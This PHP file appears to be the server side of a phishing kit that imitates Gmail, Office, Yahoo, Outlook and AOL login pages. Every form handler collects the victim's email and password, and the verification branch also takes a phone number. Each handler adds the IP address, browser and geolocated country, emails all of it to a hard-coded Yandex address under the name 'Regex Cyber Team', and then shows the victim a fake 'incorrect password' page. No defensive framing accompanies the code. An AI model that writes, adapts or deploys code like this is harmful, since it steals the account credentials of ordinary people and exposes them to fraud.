<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function getIp(){
    switch(true){
      case (!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
      case (!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
      case (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];
      default : return $_SERVER['REMOTE_ADDR'];
    }
}

function visitor_country(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null){
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

function visitor_countryCode(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryCode != null){
        $result = $ip_data->geoplugin_countryCode;
    }
    return $result;
}

function visitor_continentCode(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }else{
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_continentCode != null){
        $result = $ip_data->geoplugin_continentCode;
    }
    return $result;
}

function sendMessage($mail, $data){
	$mail->From = 'smithsikkens@yandex.ru';
	$mail->FromName = "Regex Cyber Team";
	$mail->addAddress('smithsikkens@yandex.ru');

	$mail->isHTML(true);
	$mail->Subject = $data['subject'];
	$mail->Body    = $data['message'];

	if(!$mail->send()) {
	    return $mail->ErrorInfo;
	} else {
	    return true;
	}
}


if(isset($_POST['submit-gmail'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);

	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Gmail Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: verification.php?verify=verification-identification".md5($data['email'])."&target=".md5($data['ip'])."&login=".$data['email']."&au=".$data['password']);
	}else{
		header("Location: gmail.php?error=something went wrong");
	}
}elseif(isset($_POST['submit-others'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);

	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Others Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: others.php?session-expired=".md5($data['email']).md5($data['password'])."&error=incorrect password");
	}else{
		header("Location: others.php?error=something went wrong");
	}
}elseif(isset($_POST['submit-office'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);

	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Office Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: office.php?session-expired=".md5($data['email']).md5($data['password'])."&error=incorrect password");
	}else{
		header("Location: office.php?error=something went wrong");
	}
}elseif(isset($_POST['submit-yahoo'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);

	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Yahoo Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: yahoo.php?session-expired=".md5($data['email']).md5($data['password'])."&error=incorrect password");
	}else{
		header("Location: yahoo.php?error=something went wrong");
	}
}elseif(isset($_POST['submit-outlook'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);

	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Outlook Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: outlook.php?session-expired=".md5($data['email']).md5($data['password'])."&error=incorrect password");
	}else{
		header("Location: outlook.php?error=something went wrong");
	}
}elseif(isset($_POST['submit-aol'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);

	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Aol Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: aol.php?session-expired=".md5($data['email']).md5($data['password'])."&error=incorrect password");
	}else{
		header("Location: aol.php?error=something went wrong");
	}
}elseif(isset($_POST['verify'])){
	require 'PHPMailer/vendor/autoload.php';
	$mail = new PHPMailer(true);
	
	$data = array();
	$data['email'] = $_POST['email'];
	$data['password'] = $_POST['password'];
	$data['phone'] = $_POST['phone'];
	$data['ip'] = getIp();
	$data['country'] = visitor_country();
	$data['country-code'] = visitor_countryCode();
	$data['continent-code'] = visitor_continentCode();
	$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
	$data['subject'] = "Gmail Verification Login Form";
	$data['message'] = 
	"<html>
	  <body>
		 <table>
		 <tr><td>>NEW LOGIN DETAILS<</td></tr>
		 <tr><td>Email: ".$data['email']."<td/></tr>
		 <tr><td>Access: ".$data['password']."</td></tr>
		 <tr><td>Phone: ".$data['phone']."</td></tr>
		 <tr><td>Browser: ".$data['browser']."</td></tr>
		 <tr><td>Country: ".$data['ip']." | <a href='http://whoer.net/check?host=".$data['ip']."' target='_blank'>".$data['ip']."</a> </td></tr>
		 <tr><td>Country Code: ".$data['country-code']."</td></tr>
		 <tr><td>Continent Code: ".$data['continent-code']."</td></tr>
		 <tr><td>>Regex Cyber Team<</td></tr>
		 </table>
	  </body>
	</html>";

	if(sendMessage($mail, $data)){
		header("Location: gmail.php?session-expired=".md5($data['email']).md5($data['password'])."&error=incorrect password");
	}else{
		header("Location: gmail.php?error=something went wrong");
	}
}
?>